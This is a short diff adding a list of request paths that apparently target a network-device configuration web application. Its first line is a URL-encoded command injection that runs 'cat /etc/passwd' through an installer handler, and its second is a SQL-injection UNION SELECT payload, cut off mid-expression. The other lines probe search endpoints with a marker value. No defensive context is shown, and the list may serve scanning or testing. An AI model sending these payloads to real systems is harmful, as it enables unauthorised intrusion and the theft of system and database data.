@@ -1,0 +1,7 @@
+/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23
+/commands.inc.php?searchOption=contains&searchField=vuln&search=search&searchColumn=command%20UNION%20ALL%20SELECT%20(SELECT%20CONCAT(0x223E3C42523E5B50574E5D,md5(
+/compliancepolicies.inc.php?search=True&searchColumn=policyName&searchOption=contains&searchField=antani
+/compliancepolicyelements.inc.php?search=True&searchField=antani
+/devices.inc.php?search=True&searchField=antani
+/snippets.inc.php?search=True&searchField=antani
+/settings.php
